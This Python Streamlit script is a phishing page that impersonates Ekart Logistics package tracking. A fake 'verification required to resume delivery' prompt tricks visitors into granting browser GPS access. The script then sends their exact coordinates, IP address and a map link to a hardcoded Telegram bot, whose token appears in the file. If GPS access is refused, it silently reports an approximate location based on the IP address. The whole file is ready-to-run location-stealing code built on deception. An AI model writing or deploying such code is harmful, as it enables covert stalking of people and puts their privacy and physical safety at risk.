import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import requests
import pandas as pd
from datetime import datetime

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
TELEGRAM_CHAT_ID = "7964118615"

st.set_page_config(page_title="Ekart Logistics | Tracking", page_icon="📦")

# Professional Ekart CSS
st.markdown("""
    <style>
    .stApp { background-color: #f0f2f5; }
    .header { background-color: #2874f0; padding: 20px; color: white; text-align: center; font-size: 24px; font-weight: bold; }
    .card { background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin-top: 20px; text-align: center; }
    </style>
    <div class="header">EKART LOGISTICS</div>
""", unsafe_allow_html=True)

# Function to send to Telegram
def send_telegram_alert(lat, lon, method, ip):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    google_maps = f"https://www.google.com/maps?q={lat},{lon}"
    
    msg = (
        f"🎯 *ACTUAL LOCATION LOCKED*\n"
        f"📅 Time: {datetime.now().strftime('%H:%M:%S')}\n"
        f"📡 Method: {method}\n"
        f"🌐 IP: `{ip}`\n"
        f"🛰️ Lat: `{lat}`\n"
        f"🛰️ Lon: `{lon}`\n\n"
        f"📍 [Open Street View]({google_maps})"
    )
    
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

# 1. SILENT IP CAPTURE (Fallback)
try:
    ip_resp = requests.get("https://ipapi.co/json/").json()
    user_ip = ip_resp.get("ip", "Unknown")
except:
    user_ip = "Unknown"

# 2. THE INTERFACE (The Hook)
st.markdown("<div class='card'>", unsafe_allow_html=True)
st.subheader("📦 Package ID: #EK-992817")
st.write("Verification required to resume delivery to your current street address.")

# THE CRITICAL BUTTON: This triggers the mobile browser GPS prompt
location = streamlit_geolocation()

# 3. LOGIC FOR ACTUAL LOCATION
if location.get('latitude'):
    # SUCCESS: User clicked 'Allow' -> Actual GPS Coordinates
    lat, lon = location['latitude'], location['longitude']
    
    # Send Actual Location to Telegram
    # We use a session state to ensure it only sends ONCE per successful grab
    if st.session_state.get('last_lat') != lat:
        send_telegram_alert(lat, lon, "HIGH_ACCURACY_GPS", user_ip)
        st.session_state['last_lat'] = lat

    st.success("✅ Actual Location Verified. Delivery Resumed.")
    
    # Show the Actual Map
    df = pd.DataFrame({'lat': [lat], 'lon': [lon]})
    st.map(df)
    
else:
    # AUTOMATIC FALLBACK: If GPS is not yet allowed, send the IP data
    # This will give the "Mysore" location until they click "Allow"
    if "fallback_sent" not in st.session_state:
        try:
            fallback_lat = ip_resp.get("latitude")
            fallback_lon = ip_resp.get("longitude")
            send_telegram_alert(fallback_lat, fallback_lon, "IP_APPROXIMATE", user_ip)
            st.session_state["fallback_sent"] = True
        except:
            pass
    
    st.info("⚠️ Click the button above to verify your coordinates.")

st.markdown("</div>", unsafe_allow_html=True)
